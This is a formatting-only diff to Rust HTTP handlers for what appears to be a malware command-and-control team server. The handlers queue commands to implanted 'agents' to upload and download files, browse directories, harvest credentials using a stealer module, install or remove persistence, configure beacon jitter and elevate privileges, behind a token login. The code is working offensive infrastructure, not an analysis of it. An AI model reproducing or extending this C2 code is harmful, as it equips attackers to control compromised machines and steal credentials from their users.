@@ -1,10 +1,10 @@
 //! API Handlers
-//! 
+//!
 //! HTTP request handlers for the team client API.
 
 use axum::{
     extract::{Path, State},
-    http::{StatusCode, HeaderMap},
+    http::{HeaderMap, StatusCode},
     Json,
 };
 use std::sync::Arc;
@@ -34,11 +34,14 @@ pub async fn list_agents(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let agents = state.get_agents().await;
     let total = agents.len();
-    
-    Ok(Json(ApiResponse::success(AgentListResponse { agents, total })))
+
+    Ok(Json(ApiResponse::success(AgentListResponse {
+        agents,
+        total,
+    })))
 }
 
 /// Get a specific agent by ID
@@ -55,7 +58,7 @@ pub async fn get_agent(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     match state.get_agent(id).await {
         Some(agent) => Ok(Json(ApiResponse::success(agent))),
         None => Err(StatusCode::NOT_FOUND),
@@ -77,7 +80,7 @@ pub async fn send_command(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     match state.send_command(id, request.command.clone()).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
@@ -106,10 +109,11 @@ pub async fn send_command_all(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let results = state.send_command_all(request.command.clone()).await;
-    let responses: Vec<CommandResponse> = results.into_iter().map(|(id, result)| {
-        match result {
+    let responses: Vec<CommandResponse> = results
+        .into_iter()
+        .map(|(id, result)| match result {
             Ok(_) => CommandResponse {
                 success: true,
                 message: format!("Command sent to agent {}", id),
@@ -120,9 +124,9 @@ pub async fn send_command_all(
                 message: e,
                 agent_id: id,
             },
-        }
-    }).collect();
-    
+        })
+        .collect();
+
     Ok(Json(ApiResponse::success(responses)))
 }
 
@@ -141,7 +145,7 @@ pub async fn download_file(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let command = format!("__DOWNLOAD__:{}", request.remote_path);
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
@@ -172,8 +176,11 @@ pub async fn upload_file(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
-    let command = format!("__UPLOAD__|{}|{}", request.remote_path, request.local_data_base64);
+
+    let command = format!(
+        "__UPLOAD__|{}|{}",
+        request.remote_path, request.local_data_base64
+    );
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
@@ -203,7 +210,7 @@ pub async fn list_directory(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     // If path is empty, agent will list current directory
     let command = if request.path.is_empty() {
         "__LISTDIR__".to_string()
@@ -213,7 +220,14 @@ pub async fn list_directory(
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
-            message: format!("List directory request sent for: {}", if request.path.is_empty() { "current directory" } else { &request.path }),
+            message: format!(
+                "List directory request sent for: {}",
+                if request.path.is_empty() {
+                    "current directory"
+                } else {
+                    &request.path
+                }
+            ),
             agent_id: id,
         })),
         Err(e) => Ok(Json(CommandResponse {
@@ -239,7 +253,7 @@ pub async fn change_directory(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let command = format!("__CD__:{}", request.path);
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
@@ -269,7 +283,7 @@ pub async fn get_cwd(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     match state.send_command(id, "__PWD__".to_string()).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
@@ -298,7 +312,7 @@ pub async fn harvest_credentials(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     // TODO: Full implementation should coordinate with the main server's module system
     // to upload stealer.enc and stealer.key before sending the harvest command.
     // Currently sends __HARVEST__ directly which requires modules to be pre-deployed.
@@ -331,7 +345,7 @@ pub async fn set_persistence(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let command = format!("__PERSIST__:{}", request.method);
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
@@ -361,8 +375,11 @@ pub async fn remove_persistence(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
-    match state.send_command(id, "__PERSIST_REMOVE__".to_string()).await {
+
+    match state
+        .send_command(id, "__PERSIST_REMOVE__".to_string())
+        .await
+    {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
             message: "Remove persistence command sent".to_string(),
@@ -391,7 +408,7 @@ pub async fn configure_beacon(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     let command = format!("__BEACON__:{}:{}", request.interval, request.jitter);
     match state.send_command(id, command).await {
         Ok(_) => Ok(Json(CommandResponse {
@@ -421,7 +438,7 @@ pub async fn elevate_agent(
     } else {
         return Err(StatusCode::UNAUTHORIZED);
     }
-    
+
     match state.send_command(id, "__ELEVATE__".to_string()).await {
         Ok(_) => Ok(Json(CommandResponse {
             success: true,
@@ -442,8 +459,9 @@ pub async fn login(
     Json(request): Json<LoginRequest>,
 ) -> Json<LoginResponse> {
     // Use constant-time comparison to prevent timing attacks
-    let password_match = constant_time_compare(request.password.as_bytes(), state.api_password.as_bytes());
-    
+    let password_match =
+        constant_time_compare(request.password.as_bytes(), state.api_password.as_bytes());
+
     if password_match {
         let token = state.create_token(request.username.clone()).await;
         Json(LoginResponse {
@@ -465,7 +483,7 @@ fn constant_time_compare(a: &[u8], b: &[u8]) -> bool {
     if a.len() != b.len() {
         return false;
     }
-    
+
     let mut result = 0u8;
     for (x, y) in a.iter().zip(b.iter()) {
         result |= x ^ y;
@@ -495,9 +513,7 @@ pub async fn logout(
 }
 
 /// Get server status
-pub async fn server_status(
-    State(state): State<Arc<ApiState>>,
-) -> Json<ServerStatus> {
+pub async fn server_status(State(state): State<Arc<ApiState>>) -> Json<ServerStatus> {
     let agents = state.get_agents().await;
     Json(ServerStatus {
         status: "running".to_string(),
